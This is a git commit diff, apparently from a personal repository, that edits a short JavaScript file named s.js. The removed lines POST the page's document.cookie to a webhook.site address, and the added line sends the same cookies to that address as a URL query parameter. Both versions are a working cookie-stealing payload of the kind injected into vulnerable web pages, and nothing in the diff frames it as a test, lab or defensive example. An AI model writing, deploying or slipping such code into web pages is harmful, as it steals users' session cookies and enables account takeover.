8aa5d7df3cd2153c6c4eee150749646bc2ef39a3
dSp3ar <98909512+dSp3ar@users.noreply.github.com>
2025-05-14 05:14:56 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,4 +1,1 @@
-fetch("https://webhook.site/511a8123-6c3f-4bcd-9a34-6ff44e2c698e", {
-  method: "POST",
-  body: document.cookie
-});
+fetch("https://webhook.site/511a8123-6c3f-4bcd-9a34-6ff44e2c698e?q="+document.cookie);
